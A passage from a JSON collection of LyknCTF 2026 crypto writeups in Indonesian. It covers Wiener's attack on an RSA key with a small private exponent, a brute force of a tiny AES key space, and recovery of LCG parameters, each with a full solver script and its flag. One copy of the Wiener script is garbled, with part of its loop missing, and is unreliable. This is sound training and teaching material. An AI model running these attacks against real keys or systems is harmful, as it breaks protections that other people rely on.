n=int(kdf[\"subset_sum_problem?\"]),\r\n        r=int(kdf[\"r\"]),\r\n        p=int(kdf[\"p\"]),\r\n        dklen=int(kdf[\"dklen\"]),\r\n        workers=args.workers,\r\n    )\r\n\r\n    print(f\"[+] master key: {master_key.hex()}\")\r\n    plaintext = Shiina256PIGE(master_key).decrypt(bytes.fromhex(data[\"finally\"]))\r\n    decoded = plaintext.decode()\r\n    print(f\"[+] plaintext: {decoded}\")\r\n    print(f\"<FLAG>{decoded}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{Connect_The_World}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-crypto-shortcut",
    "title": "Shortcut (LyknCTF 2026)",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "CTF Writeup: Shortcut (LyknCTF 2026)",
    "problemDescription": "Tantangan ini menyediakan sebuah skema enkripsi flag menggunakan kombinasi RSA dan AES-GCM. Berdasarkan source code gen_params.py, parameter RSA yang dibuat sengaja diturunkan kekuatannya (vulnerable) pada bagian eksponen privat $d$:\n\nd_target_bits = int(bits * 0.205)  # 1536 * 0.205 = ~314 bits\n...\nwiener_bound = isqrt(isqrt(N)) // 3\nif d >= wiener_bound:\n    continue\n\n\nServer juga memberikan tiga jenis informasi bocoran (leakages):\n\nleakage1: Sisa bagi $(p-1)$ dan $(q-1)$ terhadap modulus kecil.\n\nleakage2: Nilai $S = \\text{gcd}(p+q, \\text{small\\_value})$.\n\nleakage3: Sisa bagi $\\lambda_n \\pmod{M_3}$.\n\nKunci AES-GCM diturunkan menggunakan HKDF dengan input Injected Key Material (IKM) berupa gabungan hash SHA256 dari komponen $V_{\\text{int}}$ (16-bytes pertama dari $d$), $S$, dan $\\lambda_n$.",
    "tools": [],
    "analysis": "### 1. Eksploitasi Wiener's Attack (Red Herring Leakages)\n\nMeskipun pembuat soal memberikan banyak informasi leakage aritmetika modular yang tampak rumit, batasan eksplisit dari $d$ diatur agar selalu berada di bawah batas Wiener:\n\n$$d < \\frac{1}{3}N^{0.25}$$\n\nSesuai dengan teorema Wiener's Attack, jika eksponen privat memenuhi syarat tersebut, maka fraksi $\\frac{k}{d}$ merupakan salah satu nilai konvergen dari ekspansi pecahan berlanjut (continued fractions) dari $\\frac{e}{N}$.\n\nKarena kita diberikan nilai publik $N$ dan $e$, kita bisa langsung memulihkan nilai $d, p,$ dan $q$ secara instan tanpa perlu memedulikan informasi tambahan dari leakage1 dan leakage3.\n\n### 2. Rekonstruksi Kunci AES-GCM\n\nSetelah Wiener's Attack berhasil memulihkan faktor prima $p$ dan $q$, kita dapat merekonstruksi parameter rahasia lainnya yang dibutuhkan oleh fungsi KDF:\n\nNilai $\\phi(N) = (p-1)(q-1)$\n\nNilai $\\lambda_n = \\text{lcm}(p-1, q-1) = \\frac{\\phi(N)}{\\text{gcd}(p-1, q-1)}$\n\nNilai $S$ sudah diberikan secara mentah oleh server pada bidang leakage2. Dengan data $d, S,$ dan $\\lambda_n$ yang sudah lengkap, kita dapat mengeksekusi HKDF secara lokal untuk memperoleh aes_key.",
    "solution": [
      {
        "title": "Skrip Eksploitasi (Python)",
        "content": "```python\nimport json\nimport hashlib\nimport math\nfrom Crypto.Util.number import long_to_bytes, GCD\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.kdf.hkdf import HKDF\n\ndata = {\n  \"N\": \"1189865343852471773069395469113572924480641038338018888079373496978577447575992848300928819755521182030670768391717374546888380512805243995093373204100013014380458624469428659765875752523718415657251368998263601503326556210003219967206063940353503211956888136162254733314901989993427052026712707754236067931472280522891306739865545061192557187594474875051185509807329675380153845965686108818740202849070288019123641795380616287245973720406328384769122055372401497\",\n  \"e\": \"320726919524370925367292807213131544969176601757371110873481439886584305157650288985108594248994740664012502353527289171343608534178265248067926531618249986973214258362055873547949838235484056951502167210708249626994656028247977119990162870192528367261273935793048060865674621367429935176892090964525405305066540849167972743409829269180507558926563533115534403465211420828680403999018069977949265874454615711748676143401273610407500902708921022215059610187215919\",\n  \"encrypted_flag\": \"733745028dd84e2f6281204fd8de3a813e65ede604ad849ab3dcfc95bd886519d4fc568875afac0837\",\n  \"nonce\": \"be871e092aa0fa60506b0db5\",\n  \"tag\": \"41bcd47b3490405b858e9e0f0acb4518\",\n  \"leakage2\": {\"S\": \"2\"}\n}\n\nN = int(data[\"N\"])\ne = int(data[\"e\"])\nciphertext = bytes.fromhex(data[\"encrypted_flag\"])\nnonce = bytes.fromhex(data[\"nonce\"])\ntag = bytes.fromhex(data[\"tag\"])\nS = int(data[\"leakage2\"][\"S\"])\n\ndef continued_fractions(n, d):\n    cf = []\n    while d:\n        q = n // d\n        cf.append(q)\n        n, d = d, n - q * d\n    return cf\n\ndef convergents(cf):\n    n0, d0 = cf[0], 1\n    if len(cf) == 1:\n        return [(n0, d0)]\n    n1, d1 = cf[0] * cf[1] + 1, cf[1]\n    convs = [(n0, d0), (n1, d1)]\n    for i in range(2, len(cf)):\n    \n    phi_cand = (e * d_cand - 1) // k\n    b = N - phi_cand + 1\n    discr = b*b - 4*N\n    if discr >= 0:\n        import math\n        isqrt_discr = math.isqrt(discr)\n        if isqrt_discr * isqrt_discr == discr:\n            p_cand = (b + isqrt_discr) // 2\n            q_cand = (b - isqrt_discr) // 2\n            if p_cand * q_cand == N:\n                p, q, d = p_cand, q_cand, d_cand\n                print(f\"[+] Parameter ditemukan melalui fraksi konvergen!\")\n                break\n\nif not p:\n    print(\"[-] Kegagalan serangan: d tidak berada dalam batas Wiener.\")\n    exit()\n\nphi = (p - 1) * (q - 1)\ng = GCD(p - 1, q - 1)\nlambda_n = phi // g\n\nd_bytes = long_to_bytes(d)\nV_int = d_bytes[:16]\n\nH1 = hashlib.sha256(V_int).digest()\nH2 = hashlib.sha256(long_to_bytes(S)).digest()\nH3 = hashlib.sha256(long_to_bytes(lambda_n)).digest()\nIKM = H1 + H2 + H3\n\nhkdf = HKDF(\n    algorithm=hashes.SHA256(),\n    length=32,\n    salt=b\"FastLane-RSA-2024\",\n    info=b\"FastLane-AES-Key\"\n)\naes_key = hkdf.derive(IKM)\n\nfull_ciphertext = ciphertext + tag\naesgcm = AESGCM(aes_key)\n\ntry:\n    flag = aesgcm.decrypt(nonce, full_ciphertext, None).decode()\n    print(f\"\\n[+] FLAG RESMI: {flag}\")\nexcept Exception as e:\n    print(f\"[-] Gagal melakukan dekripsi data AES-GCM: {e}\")"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import json\r\nimport hashlib\r\nfrom Crypto.Util.number import long_to_bytes, GCD\r\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.kdf.hkdf import HKDF\r\n\r\n# --- DATA DARI SERVER ---\r\ndata = {\r\n  \"N\": \"1189865343852471773069395469113572924480641038338018888079373496978577447575992848300928819755521182030670768391717374546888380512805243995093373204100013014380458624469428659765875752523718415657251368998263601503326556210003219967206063940353503211956888136162254733314901989993427052026712707754236067931472280522891306739865545061192557187594474875051185509807329675380153845965686108818740202849070288019123641795380616287245973720406328384769122055372401497\",\r\n  \"e\": \"320726919524370925367292807213131544969176601757371110873481439886584305157650288985108594248994740664012502353527289171343608534178265248067926531618249986973214258362055873547949838235484056951502167210708249626994656028247977119990162870192528367261273935793048060865674621367429935176892090964525405305066540849167972743409829269180507558926563533115534403465211420828680403999018069977949265874454615711748676143401273610407500902708921022215059610187215919\",\r\n  \"encrypted_flag\": \"733745028dd84e2f6281204fd8de3a813e65ede604ad849ab3dcfc95bd886519d4fc568875afac0837\",\r\n  \"nonce\": \"be871e092aa0fa60506b0db5\",\r\n  \"tag\": \"41bcd47b3490405b858e9e0f0acb4518\",\r\n  \"leakage2\": {\"S\": \"2\"}\r\n}\r\n\r\nN = int(data[\"N\"])\r\ne = int(data[\"e\"])\r\nciphertext = bytes.fromhex(data[\"encrypted_flag\"])\r\nnonce = bytes.fromhex(data[\"nonce\"])\r\ntag = bytes.fromhex(data[\"tag\"])\r\nS = int(data[\"leakage2\"][\"S\"])\r\n\r\n# --- IMPLEMENTASI WIENER'S ATTACK ---\r\ndef continued_fractions(n, d):\r\n    \"\"\"Membuat ekspansi pecahan berlanjut dari n/d\"\"\"\r\n    cf = []\r\n    while d:\r\n        q = n // d\r\n        cf.append(q)\r\n        n, d = d, n - q * d\r\n    return cf\r\n\r\ndef convergents(cf):\r\n    \"\"\"Menghitung konvergen (k/d) dari pecahan berlanjut\"\"\"\r\n    n0, d0 = cf[0], 1\r\n    if len(cf) == 1:\r\n        return [(n0, d0)]\r\n    n1, d1 = cf[0] * cf[1] + 1, cf[1]\r\n    conv = [(n0, d0), (n1, d1)]\r\n    for i in range(2, len(cf)):\r\n        ni = cf[i] * conv[i-1][0] + conv[i-2][0]\r\n        di = cf[i] * conv[i-1][1] + conv[i-2][1]\r\n        conv.append((ni, di))\r\n    return conv\r\n\r\nprint(\"[*] Melakukan Wiener's Attack untuk mencari d, p, dan q...\")\r\ncf = continued_fractions(e, N)\r\nconvs = convergents(cf)\r\n\r\np, q, d = None, None, None\r\n\r\nfor k, d_cand in convs:\r\n    if k == 0 or d_cand % 2 == 0:\r\n        continue\r\n    \r\n    # Hitung kemungkinan phi\r\n    phi_cand = (e * d_cand - 1) // k\r\n    \r\n    # Selesaikan persamaan kuadrat x^2 - (N - phi + 1)x + N = 0\r\n    b = N - phi_cand + 1\r\n    discr = b*b - 4*N\r\n    if discr >= 0:\r\n        import math\r\n        # Cek akar sempurna\r\n        isqrt_discr = math.isqrt(discr)\r\n        if isqrt_discr * isqrt_discr == discr:\r\n            p_cand = (b + isqrt_discr) // 2\r\n            q_cand = (b - isqrt_discr) // 2\r\n            if p_cand * q_cand == N:\r\n                p, q, d = p_cand, q_cand, d_cand\r\n                print(f\"[+] Parameter ditemukan!\")\r\n                print(f\"    p = {p}\")\r\n                print(f\"    q = {q}\")\r\n                print(f\"    d = {d}\")\r\n                break\r\n\r\nif not p:\r\n    print(\"[-] Gagal memulihkan p dan q melalui Wiener's Attack.\")\r\n    exit()\r\n\r\n# --- REKONSTRUKSI PARAMETER RAHASIA ---\r\nphi = (p - 1) * (q - 1)\r\ng = GCD(p - 1, q - 1)\r\nlambda_n = phi // g\r\n\r\n# --- REKONSTRUKSI KUNCI AES ---\r\nd_bytes = long_to_bytes(d)\r\nV_int = d_bytes[:16]\r\n\r\nH1 = hashlib.sha256(V_int).digest()\r\nH2 = hashlib.sha256(long_to_bytes(S)).digest()\r\nH3 = hashlib.sha256(long_to_bytes(lambda_n)).digest()\r\n\r\nIKM = H1 + H2 + H3\r\n\r\nhkdf = HKDF(\r\n    algorithm=hashes.SHA256(),\r\n    length=32,\r\n    salt=b\"FastLane-RSA-2024\",\r\n    info=b\"FastLane-AES-Key\"\r\n)\r\naes_key = hkdf.derive(IKM)\r\nprint(f\"[+] AES Key pulih: {aes_key.hex()}\")\r\n\r\n# --- DEKRIPSI AES-GCM ---\r\n# Perhatikan bahwa di python cryptography, tag harus digabung di akhir ciphertext untuk AESGCM\r\nfull_ciphertext = ciphertext + tag\r\naesgcm = AESGCM(aes_key)\r\n\r\ntry:\r\n    flag = aesgcm.decrypt(nonce, full_ciphertext, None).decode()\r\n    print(f\"\\n[+] FLAG: {flag}\")\r\nexcept Exception as e:\r\n    print(f\"[-] Gagal melakukan dekripsi: {e}\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{02c680c05d2d4bf6a3d761b32ea785b2}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-crypto-sleeplessmachine",
    "title": "Sleepless Machine",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**CTF:** LYKNCTF 2026  \n**Category:** Crypto  \n**Difficulty:** Medium  \n**Flag:** `LYKNCTF{888913966304452fb05a9b00861c76c0}`",
    "problemDescription": "> An old machine keeps running day and night in a forgotten bunker, broadcasting the same unchanging sequence. No one remembers what it was built for.\n\nServer memberikan public key bergaya NTRU, empat nilai leakage, dan flag yang dienkripsi memakai AES-GCM. Kelihatannya private polynomial `f` dan `g` perlu direkonstruksi, tetapi jalur tersebut tidak diperlukan.",
    "tools": [],
    "analysis": "Parameter utama dari generator:\n\n```python\nN = 127\nQ = 4093\nQ_PRIME = 1000003\nDENSITY = 0.36\n```\n\nSecret yang dipakai untuk membuat key adalah:\n\n```python\ns_alg = weighted_trace(f, g, N, Q_PRIME)\n```\n\nNilai itu kemudian langsung dimasukkan ke HKDF:\n\n```python\nikm = (\n    s_alg.to_bytes(4, \"big\")\n    + N.to_bytes(2, \"big\")\n    + q.to_bytes(2, \"big\")\n    + q_prime.to_bytes(4, \"big\")\n)\n```\n\nMasalah utamanya ada pada domain `s_alg`:\n\n```python\ns_alg = weighted_trace(...) % 1000003\n```\n\nArtinya key AES hanya memiliki maksimal `1,000,003` kemungkinan. Public key NTRU tidak perlu diserang; cukup brute-force seluruh kandidat `s_alg`, turunkan key HKDF, lalu cek AES-GCM.",
    "solution": [
      {
        "title": "Memanfaatkan Leakage",
        "content": "Polynomial dibuat oleh `constrained_ternary()`, sehingga setiap koefisien hanya bernilai `-1`, `0`, atau `1`.\n\nLeakage yang diberikan:\n\n\n\nGenerator menaruh koefisien awal sesuai target sum, kemudian menambahkan pasangan `(+1, -1)` pada indeks genap dan ganjil. Karena algoritma pembentukannya diketahui, jumlah koefisien positif dan negatif dapat dihitung tepat dari leakage.\n\nUntuk polynomial dengan target genap `te`, target ganjil `to`, dan `N = 127`:\n\n\n\nDari jumlah tanda pada `f` dan `g`, kita bisa menghitung banyaknya produk positif dan negatif:\n\n\n\nPada cyclic convolution, setiap pasangan koefisien menyumbang tepat satu kali ke `weighted_trace`, dengan bobot antara `1` sampai `N`.\n\nBatas integer untuk weighted trace sebelum modulo menjadi:\n\n\n\nInterval `[lo, hi]` dipetakan ke residue modulo `q_prime`. Pada instance normal, kandidat turun dari sekitar satu juta menjadi kurang lebih 280–300 ribu.",
        "code": "f_even_sum\nf_odd_sum\ng_even_sum\ng_odd_sum"
      },
      {
        "title": "Optimasi Brute Force",
        "content": "Setiap kandidat diuji dengan alur:\n\n1. Turunkan key melalui HKDF-SHA256.\n2. Dekripsi beberapa byte awal ciphertext.\n3. Buang kandidat jika plaintext tidak diawali `LYKN{` atau `LYKNCTF{`.\n4. Jalankan `decrypt_and_verify()` hanya pada kandidat yang lolos prefix.\n5. Bagi interval ke beberapa worker menggunakan `multiprocessing`.\n\nPrefix check menghindari kalkulasi verifikasi tag GCM pada hampir semua kandidat."
      },
      {
        "title": "Menjalankan Solver",
        "content": "Solver juga menerima instance dari file:\n\n\n\nAtau dari stdin:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py HOST PORT -j 16"
      },
      {
        "title": "Output",
        "content": "",
        "code": "[*] weighted integer bound: ...\n[*] candidate residues: ... / 1000003\n[*] workers: 16\n[+] s_alg = ...\n<FLAG>LYKNCTF{888913966304452fb05a9b00861c76c0}</FLAG>"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport hashlib\r\nimport hmac\r\nimport json\r\nimport multiprocessing as mp\r\nimport os\r\nimport socket\r\nimport sys\r\nfrom typing import Iterable\r\n\r\nfrom Crypto.Cipher import AES\r\n\r\nKDF_INFO = b\"lyknctf-2026\"\r\nDENSITY = 0.36\r\nFLAG_PREFIXES = (b\"LYKN{\", b\"LYKNCTF{\")\r\nG = {}\r\n\r\n\r\ndef extract_json(data: bytes):\r\n    \"\"\"Return (object, end_offset) for the first complete JSON object in data.\"\"\"\r\n    text = data.decode(errors=\"ignore\")\r\n    starts = [i for i, ch in enumerate(text) if ch == \"{\"]\r\n    for start in starts:\r\n        depth = 0\r\n        in_string = False\r\n        escaped = False\r\n        for i in range(start, len(text)):\r\n            ch = text[i]\r\n            if in_string:\r\n                if escaped:\r\n                    escaped = False\r\n                elif ch == \"\\\\\":\r\n                    escaped = True\r\n                elif ch == '\"':\r\n                    in_string = False\r\n                continue\r\n            if ch == '\"':\r\n                in_string = True\r\n            elif ch == \"{\":\r\n                depth += 1\r\n            elif ch == \"}\":\r\n                depth -= 1\r\n                if depth == 0:\r\n                    candidate = text[start : i + 1]\r\n                    try:\r\n                        return json.loads(candidate), i + 1\r\n                    except json.JSONDecodeError:\r\n                        break\r\n    return None, None\r\n\r\n\r\ndef sign_counts(target_even: int, target_odd: int, N: int):\r\n    \"\"\"Exact +/- coefficient counts produced by constrained_ternary().\"\"\"\r\n    used = abs(target_even) + abs(target_odd)\r\n    target_total = int(DENSITY * N)\r\n    pad_needed = max(target_total - used, 0)\r\n    pairs_per_parity = pad_needed // 4 + 1\r\n\r\n    positive = max(target_even, 0) + max(target_odd, 0) + 2 * pairs_per_parity\r\n    negative = max(-target_even, 0) + max(-target_odd, 0) + 2 * pairs_per_parity\r\n    return positive, negative\r\n\r\n\r\ndef residue_intervals(lo: int, hi: int, modulus: int):\r\n    \"\"\"Convert every integer in [lo, hi] into compact residue intervals mod modulus.\"\"\"\r\n    if hi - lo + 1 >= modulus:\r\n        return [(0, modulus)]\r\n\r\n    pieces = []\r\n    first_k = lo // modulus\r\n    last_k = hi // modulus\r\n    for k in range(first_k, last_k + 1):\r\n        left = max(lo, k * modulus)\r\n        right = min(hi, (k + 1) * modulus - 1)\r\n        if left <= right:\r\n            pieces.append((left - k * modulus, right - k * modulus + 1))\r\n\r\n    merged = []\r\n    for left, right in sorted(pieces):\r\n        if merged and left <= merged[-1][1]:\r\n            merged[-1] = (merged[-1][0], max(merged[-1][1], right))\r\n        else:\r\n            merged.append((left, right))\r\n    return merged\r\n\r\n\r\ndef candidate_intervals(instance: dict):\r\n    params = instance[\"parameters\"]\r\n    leak = instance[\"leakage\"]\r\n    N = int(params[\"N\"])\r\n    q_prime = int(params[\"q_prime\"])\r\n\r\n    fp, fn = sign_counts(int(leak[\"f_even_sum\"]), int(leak[\"f_odd_sum\"]), N)\r\n    gp, gn = sign_counts(int(leak[\"g_even_sum\"]), int(leak[\"g_odd_sum\"]), N)\r\n\r\n    positive_products = fp * gp + fn * gn\r\n    negative_products = fp * gn + fn * gp\r\n\r\n    # Every pair f_i*g_j contributes once to weighted_trace with weight 1..N.\r\n    lo = positive_products - N * negative_products\r\n    hi = N * positive_products - negative_products\r\n    return residue_intervals(lo, hi, q_prime), (lo, hi)\r\n\r\n\r\ndef init_worker(instance: dict):\r\n    params = instance[\"parameters\"]\r\n    enc = instance[\"encrypted_flag\"]\r\n    N = int(params[\"N\"])\r\n    q = int(params[\"q\"])\r\n    q_prime = int(params[\"q_prime\"])\r\n\r\n    G.clear()\r\n    G.update(\r\n        salt=str(N).encode(),\r\n        info=KDF_INFO,\r\n        ikm_suffix=(\r\n            N.to_bytes(2, \"big\")\r\n            + q.to_bytes(2, \"big\")\r\n            + q_prime.to_bytes(4, \"big\")\r\n        ),\r\n        nonce=bytes.fromhex(enc[\"nonce\"]),\r\n        ciphertext=bytes.fromhex(enc[\"ciphertext\"]),\r\n        tag=bytes.fromhex(enc[\"tag\"]),\r\n    )\r\n\r\n\r\ndef derive_key(s_alg: int):\r\n    ikm = s_alg.to_bytes(4, \"big\") + G[\"ikm_suffix\"]\r\n    prk = hmac.digest(G[\"salt\"], ikm, \"sha256\")\r\n    return hmac.digest(prk, G[\"info\"] + b\"\\x01\", \"sha256\")\r\n\r\n\r\ndef test_chunk(bounds):\r\n    start, stop = bounds\r\n    nonce = G[\"nonce\"]\r\n    ciphertext = G[\"ciphertext\"]\r\n    tag = G[\"tag\"]\r\n    head_len = min(8, len(ciphertext))\r\n\r\n    for s_alg in range(start, stop):\r\n        key = derive_key(s_alg)\r\n\r\n        # Prefix test avoids the expensive GHASH/tag check for almost all keys.\r\n        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)\r\n        head = cipher.decrypt(ciphertext[:head_len])\r\n        if not head.startswith(FLAG_PREFIXES):\r\n            continue\r\n\r\n        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)\r\n        try:\r\n            plaintext = cipher.decrypt_and_verify(ciphertext, tag)\r\n        except ValueError:\r\n            continue\r\n        return s_alg, plaintext\r\n    return None\r\n\r\n\r\ndef make_chunks(intervals: Iterable[tuple[int, int]], chunk_size: int):\r\n    for start, stop in intervals:\r\n        for left in range(start, stop, chunk_size):\r\n            yield left, min(left + chunk_size, stop)\r\n\r\n\r\ndef solve_instance(instance: dict, workers: int, chunk_size: int = 2048):\r\n    intervals, raw_bound = candidate_intervals(instance)\r\n    total = sum(stop - start for start, stop in intervals)\r\n    print(f\"[*] weighted integer bound: {raw_bound[0]} .. {raw_bound[1]}\", file=sys.stderr)\r\n    print(f\"[*] candidate residues: {total} / {instance['parameters']['q_prime']}\", file=sys.stderr)\r\n    print(f\"[*] workers: {workers}\", file=sys.stderr)\r\n\r\n    chunks = list(make_chunks(intervals, chunk_size))\r\n    ctx = mp.get_context(\"fork\")\r\n    with ctx.Pool(workers, initializer=init_worker, initargs=(instance,)) as pool:\r\n        for result in pool.imap_unordered(test_chunk, chunks, chunksize=1):\r\n            if result is not None:\r\n                pool.terminate()\r\n                pool.join()\r\n                return result\r\n    raise RuntimeError(\"no valid AES-GCM key found\")\r\n\r\n\r\ndef load_instance_from_file(path: str):\r\n    with open(path, \"rb\") as handle:\r\n        data = handle.read()\r\n    obj, _ = extract_json(data)\r\n    if obj is None:\r\n        raise ValueError(f\"no JSON object found in {path}\")\r\n    return obj\r\n\r\n\r\ndef receive_instance(sock: socket.socket):\r\n    data = bytearray()\r\n    while True:\r\n        chunk = sock.recv(65536)\r\n        if not chunk:\r\n            raise EOFError(\"remote closed before sending a complete JSON instance\")\r\n        data.extend(chunk)\r\n        sys.stderr.buffer.write(chunk)\r\n        sys.stderr.buffer.flush()\r\n        obj, _ = extract_json(bytes(data))\r\n        if obj is not None:\r\n            return obj\r\n\r\n\r\ndef main():\r\n    parser = argparse.ArgumentParser(description=\"Sleepless Machine solver\")\r\n    parser.add_argument(\"target\", nargs=\"?\", help=\"instance JSON file, or remote host\")\r\n    parser.add_argument(\"port\", nargs=\"?\", type=int, help=\"remote port\")\r\n    parser.add_argument(\r\n        \"-j\",\r\n        \"--workers\",\r\n        type=int,\r\n        default=min(16, os.cpu_count() or 1),\r\n        help=\"number of brute-force workers (default: min(16, CPU count))\",\r\n    )\r\n    parser.add_argument(\"--chunk-size\", type=int, default=2048)\r\n    args = parser.parse_args()\r\n\r\n    if not args.target:\r\n        raw = sys.stdin.buffer.read()\r\n        instance, _ = extract_json(raw)\r\n        if instance is None:\r\n            parser.error(\"provide HOST PORT, an instance JSON file, or JSON on stdin\")\r\n        remote = None\r\n    elif args.port is None:\r\n        instance = load_instance_from_file(args.target)\r\n        remote = None\r\n    else:\r\n        remote = socket.create_connection((args.target, args.port))\r\n        instance = receive_instance(remote)\r\n\r\n    s_alg, plaintext = solve_instance(instance, max(1, args.workers), args.chunk_size)\r\n    flag = plaintext.decode()\r\n    print(f\"[+] s_alg = {s_alg}\")\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n    if remote is not None:\r\n        remote.sendall(plaintext + b\"\\n\")\r\n        remote.settimeout(2.0)\r\n        try:\r\n            while True:\r\n                chunk = remote.recv(65536)\r\n                if not chunk:\r\n                    break\r\n                sys.stdout.buffer.write(chunk)\r\n                sys.stdout.buffer.flush()\r\n        except (socket.timeout, TimeoutError):\r\n            pass\r\n        finally:\r\n            remote.close()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{888913966304452fb05a9b00861c76c0}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-crypto-twelvestep",
    "title": "Twelve Steps (LyknCTF 2026)",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "CTF Writeup: Twelve Steps (LyknCTF 2026)",
    "problemDescription": "Tantangan ini meminta kita menebak nilai berikutnya ($out[12]$) dari sebuah generator angka acak semu yang menggunakan algoritma Linear Congruential Generator (LCG).\n\nRumus dasar LCG adalah:\n\n\n$$s_{n+1} = (a \\cdot s_n + c) \\pmod m$$\n\nDi mana parameter multiplier ($a$), increment ($c$), modulus ($m$), dan seed ($s_0$) dirahasiakan. Kita diberikan $12$ output berurutan ($s_0$ hingga $s_{11}$) dan harus memprediksi $s_{12}$ untuk mendapatkan flag.",
    "tools": [],
    "analysis": "Meskipun $a$, $c$, dan $m$ dirahasiakan, kita dapat merekonstruksinya secara matematis jika memiliki minimal $6$ buah output berurutan.\n\n### 1. Menentukan Modulus ($m$)\n\nKita definisikan selisih antar state yang berurutan sebagai:\n\n\n$$d_n = s_{n+1} - s_n$$\n\nBerdasarkan rumus LCG:\n\n\n$$s_{n+2} \\equiv a \\cdot s_{n+1} + c \\pmod m$$\n\n$$s_{n+1} \\equiv a \\cdot s_n + c \\pmod m$$\n\nJika kita kurangkan kedua persamaan di atas, konstanta $c$ akan saling menghilangkan:\n\n\n$$s_{n+2} - s_{n+1} \\equiv a(s_{n+1} - s_n) \\pmod m$$\n\n$$d_{n+1} \\equiv a \\cdot d_n \\pmod m$$\n\nDari relasi ini, kita dapat menyusun determinan dari matriks transisi untuk mengeliminasi nilai $a$:\n\n\n$$d_{n+2} \\equiv a \\cdot d_{n+1} \\pmod m$$\n\n$$d_{n+1} \\equiv a \\cdot d_n \\pmod m$$\n\nKalikan silang kedua kongruensi:\n\n\n$$d_{n+2} \\cdot d_n \\equiv a \\cdot d_{n+1} \\cdot d_n \\equiv d_{n+1}^2 \\pmod m$$\n\n$$d_{n+2} \\cdot d_n - d_{n+1}^2 \\equiv 0 \\pmod m$$\n\nArtinya, untuk setiap indeks $n$, nilai $t_n = d_{n+2} \\cdot d_n - d_{n+1}^2$ merupakan kelipatan dari modulus $m$. Kita dapat mencari $m$ dengan menghitung Greatest Common Divisor (GCD) dari beberapa nilai $t_n$:\n\n\n$$m = \\gcd(t_0, t_1, t_2, \\dots)$$\n\n### 2. Menentukan Multiplier ($a$)\n\nSetelah mendapatkan modulus $m$, kita dapat mencari pengali $a$ melalui hubungan:\n\n\n$$d_{n+1} \\equiv a \\cdot d_n \\pmod m$$\n\nSecara teoretis, jika $\\gcd(d_n, m) = 1$, kita bisa langsung menggunakan modular inverse:\n\n\n$$a \\equiv d_{n+1} \\cdot d_n^{-1} \\pmod m$$\n\nNamun, jika $\\gcd(d_n, m) > 1$, modular inverse biasa tidak akan ada (menyebabkan error). Kita harus menyelesaikan persamaan linear kongruensi $ax \\equiv b \\pmod m$ dengan mereduksi seluruh komponen persamaan menggunakan nilai $\\gcd$ tersebut:\n\n\n$$g = \\gcd(d_n, m)$$\n\n$$a' \\cdot d_n' \\equiv d_{n+1}' \\pmod{m'}$$\n\n\nDi mana $d_n' = d_n / g$, $d_{n+1}' = d_{n+1} / g$, dan $m' = m / g$. Sekarang $\\gcd(d_n', m') = 1$ terjamin, sehingga kita bisa mencari modular inverse untuk mendapatkan solusi umum dari $a$.\n\n### 3. Menentukan Increment ($c$)\n\nSetelah mendapatkan $a$ dan $m$, konstanta $c$ dapat dengan mudah dicari dari persamaan awal:\n\n\n$$c \\equiv s_{1} - a \\cdot s_0 \\pmod m$$\n\nSetelah ketiga parameter ditemukan, kita bisa memprediksi nilai ke-13 ($s_{12}$):\n\n\n$$s_{12} = (a \\cdot s_{11} + c) \\pmod m$$",
    "solution": [
      {
        "title": "Skrip Eksploitasi (Python)",
        "content": "Berikut adalah skrip Python menggunakan pustaka pwntools yang secara otomatis terhubung ke server, mengambil $12$ output, memecahkan parameter LCG secara tangguh (robust terhadap ketiadaan modular inverse biasa), menghitung prediksi, mengirimkannya, dan mencetak flag.",
        "code": "from pwn import *\nfrom math import gcd\nfrom functools import reduce\n\nHOST = '51.79.140.18'\nPORT = 15937\n\ndef solve_linear_congruence(a, b, m):\n    \"\"\"\n    Menyelesaikan linear kongruensi a * x = b (mod m).\n    Mendukung kasus gcd(a, m) > 1 (multi-solusi / reduksi).\n    \"\"\"\n    g = gcd(a, m)\n    if b % g != 0:\n        raise ValueError(\"Tidak ada solusi modular inverse!\")\n    \n    # Reduksi persamaan dengan gcd\n    a_prime = a // g\n    b_prime = b // g\n    m_prime = m // g\n    \n    # Sekarang gcd(a_prime, m_prime) = 1, aman mencari modular inverse\n    inv = pow(a_prime, -1, m_prime)\n    return (inv * b_prime) % m_prime\n\ndef crack_lcg(states):\n    \"\"\"\n    Memecahkan parameter a, c, m dari barisan output LCG states.\n    \"\"\"\n    # 1. Mencari Modulus (m) menggunakan GCD dari determinan\n    diffs = [s2 - s1 for s1, s2 in zip(states, states[1:])]\n    t = [d2 * d0 - d1*d1 for d0, d1, d2 in zip(diffs, diffs[1:], diffs[2:])]\n    m = reduce(gcd, t)\n    \n    # Jika modulus terlalu kecil (akibat data/output yang sama), periksa kebenaran\n    if m < 2:\n        raise ValueError(\"Gagal menemukan modulus LCG yang valid.\")\n    \n    # 2. Mencari Multiplier (a)\n    # diffs[1] = a * diffs[0] (mod m)\n    a = solve_linear_congruence(diffs[0], diffs[1], m)\n    